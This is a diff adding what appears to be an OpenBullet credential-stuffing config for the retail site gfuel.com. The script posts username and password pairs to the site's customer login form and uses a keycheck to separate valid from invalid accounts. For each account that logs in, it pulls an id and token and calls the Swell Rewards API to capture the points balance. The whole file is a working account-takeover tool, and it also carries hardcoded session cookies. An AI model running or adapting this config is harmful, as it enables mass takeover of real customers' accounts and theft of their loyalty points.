@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Gfuel",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-31T09:02:29.0677615+03:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://gfuel.com/account/login" 
+  CONTENT "form_type=customer_login&utf8=%E2%9C%93&customer%5Bemail%5D=<USER>&customer%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__cfduid=d372f81a2bbc7be77a172e20d7545d12a1563439149; _shopify_y=6653969e-02e4-44e9-9eba-f9c649cbd169; cart_currency=USD; _orig_referrer=https%3A%2F%2Fgfuel.com%2F; secure_customer_sig=; _shopify_country=Saudi+Arabia; _landing_page=%2F; cart_sig=; _y=6653969e-02e4-44e9-9eba-f9c649cbd169; _s=043c45a9-EBC2-44F5-E138-8B740790B45A; _shopify_s=043c45a9-EBC2-44F5-E138-8B740790B45A; _shopify_fs=2019-07-18T08%3A39%3A12.194Z; _shopify_sa_p=; session-set=true; distinct_id=10127747_1563439154456_8631; amazon-pay-abtesting-new-widgets=true; amazon-pay-abtesting-apa-migration=true; bk_cart={%22t%22: %22fake_cart_token_10127747_1563439154442_3544%22%2C%22s%22:[]%2C%22a%22:[]%2C%22i%22:[]}; __olAlertsForShop=[]; _shopify_sa_t=2019-07-18T08%3A39%3A18.901Z; bkeh=d2Vld2V3ZXd3ZUBnbWFpbC5jb20=; ip_country=SA; last_lv=2019_6" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://gfuel.com" 
+  HEADER "referer: https://gfuel.com/account/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials." 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"grid__item two-thirds medium-down--one-whole\">" 
+
+REQUEST GET "https://gfuel.com/apps/loggedincustomer" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+
+PARSE "<SOURCE>" LR "\"id\":\"" "\"," -> VAR "id" 
+
+PARSE "<SOURCE>" LR "token\": \"" "\"}" -> VAR "token" 
+
+REQUEST GET "https://app.swellrewards.com/api/v1/customer_details?customer_email=<USER>&customer_external_id=<id>&customer_token=<token>&merchant_id=33869" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Origin: https://gfuel.com" 
+  HEADER "Referer: https://gfuel.com/account" 
+
+PARSE "<SOURCE>" LR "points_balance\":" ",\"" -> CAP "Points" 
+
